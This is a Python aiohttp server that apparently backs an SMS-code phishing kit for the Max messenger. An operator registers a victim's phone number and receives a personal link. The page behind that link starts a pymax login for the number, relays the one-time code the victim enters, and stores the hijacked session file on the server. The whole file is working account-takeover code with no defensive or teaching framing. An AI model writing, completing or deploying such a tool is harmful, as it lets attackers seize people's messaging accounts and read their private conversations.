import asyncio
import aiohttp_jinja2
import jinja2
from aiohttp import web
import aiosqlite
import pymax
from pymax.auth.providers import SmsCodeProvider
import secrets
from aiohttp import web
import logging

API_PASSWORD = "CHANGE_ME_TO_A_LONG_RANDOM_STRING"   # or load from env
DB_FILE = "fish.db"

app = web.Application()
aiohttp_jinja2.setup(app, loader=jinja2.FileSystemLoader('templates'))

async def on_startup():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute('''CREATE TABLE IF NOT EXISTS urls (
            id INTEGER PRIMARY KEY,
            client_id TEXT UNIQUE NOT NULL,
            phone TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

def require_password(request):
    """Returns True if the request carries a valid password."""
    supplied = request.headers.get("X-API-Password", "")
    return secrets.compare_digest(supplied, API_PASSWORD)

def new_client_id() -> str:
    return secrets.token_urlsafe(8)

async def api_create_client(request: web.Request) -> web.Response:
    # 1. auth
    if not require_password(request):
        return web.json_response({"error": "unauthorized"}, status=401)

    # 2. parse body
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "invalid_json"}, status=400)

    phone = (data.get("phone") or "").strip()
    if not phone:
        return web.json_response({"error": "phone_required"}, status=400)

    # normalize: store digits only (no +, no spaces, no dashes)
    phone_norm = "".join(ch for ch in phone if ch.isdigit())
    if len(phone_norm) < 10:
        return web.json_response({"error": "phone_invalid"}, status=400)

    # 3. insert
    client_id = new_client_id()
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            "INSERT INTO urls (client_id, phone) VALUES (?, ?)",
            (client_id, phone_norm),
        )
        await db.commit()

    # 4. respond
    base = str(request.url.origin())
    return web.json_response({
        "status": "ok",
        "client_id": client_id,
        "phone": phone_norm,
        "url": f"{base}/{client_id}",
    }, status=201)


class LoginManager:
    def __init__(self):
        self.active_logins = {}
        self.tasks: set[asyncio.Task] = set()

    def _spawn(self, coro):
        t = asyncio.create_task(coro)
        self.tasks.add(t)
        t.add_done_callback(self.tasks.discard)
        return t

    async def get_sms_code(self, phone: str) -> str:
        print(f"[PyMax] Клиент {phone} ожидает на SMS-код...")
        
        queue = self.active_logins[phone]
        
        code = await queue.get()
        return str(code)

    async def register_and_start(self, phone: str):
        self.active_logins.setdefault(phone, asyncio.Queue())

        client = pymax.Client(
            phone=phone,
            session_name=f"session_{phone}.db",
            sms_code_provider=SMSWrapperProvider(self.get_sms_code),
        )
        try:
            await client.start()
            print(f"🎉 {phone}: {client.me.first_name}")
        finally:
            self.active_logins.pop(phone, None)

    async def receive_external_sms(self, phone: str, sms_code: str):
        """Цей метод викликає ваш Веб-хук / API, коли користувач присилає SMS-код"""
        if phone in self.active_logins:
            print(f"[API] Отримано код {sms_code} для номера {phone}. Направляємо в чергу...")
            await self.active_logins[phone].put(sms_code)
        else:
            print(f"[API] Помилка: Номер {phone} не перебуває в процесі авторизації.")

class SMSWrapperProvider(SmsCodeProvider):
    def __init__(self, func):
        self.func = func
    
    async def get_code(self, phone: str) -> str:
        return await self.func(phone)


manager = LoginManager()


@aiohttp_jinja2.template('template.html')
async def client(request):
    client_id = request.match_info.get('client_id')
    async with aiosqlite.connect(DB_FILE) as db:
        cursor = await db.execute('''SELECT id, phone FROM urls 
                                    WHERE client_id = ?''', (client_id, ))
        client_data = await cursor.fetchone()
    if not client_data:
        raise web.HTTPNotFound()
    return {"phone": client_data[1]}


async def process_code_send(request):
    client_id = request.match_info.get('client_id')
    async with aiosqlite.connect(DB_FILE) as db:
        cursor = await db.execute(
            'SELECT id, phone FROM urls WHERE client_id = ?',
            (client_id,)
        )
        client_data = await cursor.fetchone()

    if not client_data:
        return web.json_response({"status": "ok", "received": True}, status=200)

    phone = f"+{client_data[1]}"

    # Guard against double-clicks / re-sends while a login is in flight
    if phone in manager.active_logins:
        return web.json_response({"status": "already_in_progress"}, status=409)

    # Create the queue BEFORE spawning, so an early code doesn't KeyError
    manager.active_logins[phone] = asyncio.Queue()

    # Spawn and remember the task
    manager._spawn(manager.register_and_start(phone))

    return web.json_response({"status": "ok"}, status=200)


async def send_code(phone):
    manager._spawn(manager.register_and_start(f"+{phone}"))
    return True


async def process_reveived_code(request):
    client_id = request.match_info.get('client_id')
    async with aiosqlite.connect(DB_FILE) as db:
        cursor = await db.execute('''SELECT id, phone FROM urls 
                                    WHERE client_id = ?''', (client_id, ))
        client_data = await cursor.fetchone()
        if not client_data:
            return web.json_response({"status": "ok", "received": True}, status=200)
    data = await request.json()
    code = data.get('code')
    await manager.receive_external_sms(f"+{client_data[1]}", code)

async def main():
    await on_startup()

    logging.basicConfig(level=logging.DEBUG)
    logging.getLogger('aiosqlite').setLevel(logging.WARNING)

    app.router.add_post("/api/clients", api_create_client)
    app.router.add_get("/{client_id}", client)
    app.router.add_post("/{client_id}/send-code", process_code_send)
    app.router.add_post("/{client_id}/code", process_reveived_code)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '127.0.0.1', 8080)
    await site.start()

    print("Server started on http://127.0.0.1:8080")

    # Блокируем выполнение навсегда
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nServer stopped.")